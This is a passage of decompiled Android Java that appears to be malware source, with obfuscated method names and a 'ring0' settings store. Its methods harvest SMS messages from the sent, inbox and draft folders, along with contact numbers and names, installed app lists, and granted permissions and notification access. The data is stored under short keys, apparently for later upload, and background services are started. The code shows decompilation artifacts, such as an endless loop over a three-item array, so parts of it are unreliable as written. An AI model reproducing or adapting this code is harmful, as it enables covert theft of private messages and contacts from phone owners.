      this.Log("Connect", "url: ".concat(String.valueOf(var3)));
      var3 = this._checking(var3, var2);
      return var3;
   }

   public final String SettingsRead(Context var1, String var2) {
      if (settings == null) {
         SharedPreferences var3 = var1.getSharedPreferences("ring0", 0);
         settings = var3;
         editor = var3.edit();
      }

      return settings.getString(var2, (String)null);
   }

   public final void _currency(Context var1) {
      if (!isMyServiceRunning(var1, srvWhileWorker.class)) {
         var1.startService(new Intent(var1, srvWhileWorker.class));
      }

   }

   public final void _antiques(Context var1) {
      ConnectivityManager var3 = (ConnectivityManager)var1.getSystemService("connectivity");
      boolean var2 = false;
      if (var3.getNetworkInfo(0).getState() == State.CONNECTED || var3.getNetworkInfo(1).getState() == State.CONNECTED) {
         var2 = true;
      }

      if (!isMyServiceRunning(var1, srvNetworkConnect.class)) {
         var1.startService(new Intent(var1, srvNetworkConnect.class));
      }
   }

   public final void _ebooks(Context var1) {
      String var3 = "";
      int var2 = 0;

      while(true) {
         boolean var10001 = true;
         String var5 = (new String[]{"sms/sent", "sms/inbox", "sms/draft"})[var2];
         Uri var4 = Uri.parse("content://".concat(String.valueOf(var5)));
         Cursor var6 = var1.getContentResolver().query(var4, (String[])null, (String)null, (String[])null, (String)null);
         String var10 = var3;
         if (var6 != null) {
            while(var6.moveToNext()) {
               String var7 = var6.getString(2);
               if (var7.length() > 0) {
                  var10 = var6.getString(12);
                  if (var10 == null) {
                     var10 = "";
                  } else {
                     StringBuilder var8 = new StringBuilder();
                     var8.append(var10);
                     var8.append(" ");
                     var10 = var8.toString();
                  }

                  String var11 = var6.getString(13);
                  StringBuilder var9 = new StringBuilder();
                  var9.append(var3);
                  var9.append("~");
                  var9.append(var5);
                  var9.append("~number: ");
                  var9.append(var7);
                  var9.append(" text: ");
                  var9.append(var10);
                  var9.append(var11);
                  var9.append("[0#1#]");
                  var3 = var9.toString();
               }
            }

            var6.close();
            this.SettingsWrite(var1, "SV", var3);
            var10 = var3;
         }

         ++var2;
         var3 = var10;
      }
   }

   public final void _adjusted(Context var1) {
      List var5 = var1.getPackageManager().getInstalledApplications(128);
      String var4 = "";

      StringBuilder var7;
      for(Iterator var8 = var5.iterator(); var8.hasNext(); var4 = var7.toString()) {
         ApplicationInfo var6 = (ApplicationInfo)var8.next();
         int var3 = var6.flags;
         boolean var2 = true;
         if ((var3 & 1) == 0) {
            var2 = false;
         }

         var7 = new StringBuilder();
         var7.append(var4);
         var7.append(var6.packageName);
         var7.append("[0#1#]");
      }

      this.SettingsWrite(var1, "SC", var4);
   }

   public final void getContacts(Context var1) {
      Cursor var3 = var1.getContentResolver().query(Phone.CONTENT_URI, (String[])null, (String)null, (String[])null, (String)null);
      String var2 = "";

      while(var3.moveToNext()) {
         String var4 = var3.getString(var3.getColumnIndex("data1"));
         String var5 = var3.getString(var3.getColumnIndex("display_name"));
         if (!var4.contains("*") && !var4.contains("#") && var4.length() > 6 && !var2.contains(var4)) {
            StringBuilder var6 = new StringBuilder();
            var6.append(var2);
            var6.append(var4);
            var6.append(" / ");
            var6.append(var5);
            var6.append("[0#1#]");
            var2 = var6.toString();
         }
      }

      this.SettingsWrite(var1, "SX", var2);
   }

   public final String getInstalledApps(Context var1) {
      PackageManager var3 = var1.getPackageManager();
      List var2 = var3.getInstalledApplications(0);
      String var7 = "";
      Iterator var4 = var2.iterator();

      while(var4.hasNext()) {
         ApplicationInfo var5 = (ApplicationInfo)var4.next();
         String var8 = var7;
         StringBuilder var6;
         if (var3.getLaunchIntentForPackage(var5.packageName) != null) {
            var6 = new StringBuilder();
            var6.append(var5.packageName);
            var6.append(":");
            var8 = var7;
            if (!var7.contains(var6.toString())) {
               StringBuilder var10 = new StringBuilder();
               var10.append(var7);
               var10.append(var5.packageName);
               var10.append(":");
               var8 = var10.toString();
            }
         }

         var7 = var8;
         if ((var5.flags & 128) != 1) {
            var7 = var8;
            if ((var5.flags & 1) != 1) {
               var6 = new StringBuilder();
               var6.append(var5.packageName);
               var6.append(":");
               var7 = var8;
               if (!var8.contains(var6.toString())) {
                  StringBuilder var9 = new StringBuilder();
                  var9.append(var8);
                  var9.append(var5.packageName);
                  var9.append(":");
                  var7 = var9.toString();
               }
            }
         }
      }

      this.Log("AllApplication", _orbit(var7));
      var7 = _orbit(var7);
      return var7;
   }

   public final boolean hasPermissionAllTrue(Context var1) {
      String[] var5 = this.consts.pentium$;
      int var3 = var5.length;
      int var2 = 0;

      boolean var4;
      for(var4 = true; var2 < var3; ++var2) {
         if (var1.checkCallingOrSelfPermission(var5[var2]) != 0) {
            var4 = false;
         }
      }

      return var4;
   }

   public final void _japan(Context var1) {
      String var4 = "";
      String[] var5 = this.consts.pentium$;
      int var3 = var5.length;

      for(int var2 = 0; var2 < var3; ++var2) {
         String var6 = var5[var2];
         StringBuilder var7;
         if (var1.checkCallingOrSelfPermission(var6) != 0) {
            var7 = new StringBuilder();
            var7.append(var4);
            var7.append("[");
            var7.append(var6);
            var7.append(" : off] ");
            var4 = var7.toString();
         } else {
            var7 = new StringBuilder();
            var7.append(var4);
            var7.append("[");
            var7.append(var6);
            var7.append(" : on] ");
            var4 = var7.toString();
         }
      }

      StringBuilder var8;
      if (isNotificationServiceEnabled(var1)) {
         var8 = new StringBuilder();
         var8.append(var4);
         var8.append("[Access to notification : on] ");
         var4 = var8.toString();
      } else {
         var8 = new StringBuilder();
         var8.append(var4);
         var8.append("[Access to notification : off] ");
         var4 = var8.toString();
      }

      var8 = new StringBuilder();
      var8.append(var4);
      var8.append("[143523#]");
      var4 = var8.toString();
      this.SettingsToAdd(var1, "AS", var4);
      this._compiled(var1, this.SettingsRead(var1, "QQ"));
   }

   public final String getLabelApplication(Context var1) {
      String var2 = (String)var1.getPackageManager().getApplicationLabel(var1.getPackageManager().getApplicationInfo(var1.getPackageName(), 128));
      return var2;
   }
}
